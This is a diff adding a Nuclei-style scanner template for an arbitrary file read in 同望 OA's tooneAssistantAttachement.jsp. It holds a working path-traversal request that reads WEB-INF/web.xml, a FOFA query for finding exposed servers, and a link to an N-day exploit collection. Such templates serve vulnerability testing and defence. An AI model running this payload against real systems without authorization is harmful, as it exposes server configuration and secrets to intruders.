@@ -1,0 +1,26 @@
+id: buildnet-oa-tooneAssistantAttachement-fileread
+info:
+  name: 同望 OA tooneAssistantAttachement - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/OracleNep/Nday-Exploit-Plan/tree/main/CNVD/%E5%90%8C%E6%9C%9BOA%20tooneAssistantAttachement%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="loginAction.struts?actionType=blockLogin"
+  tags: 2024,fileread,buildnet,oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'xml version','web-app','classpath')
+        condition: and
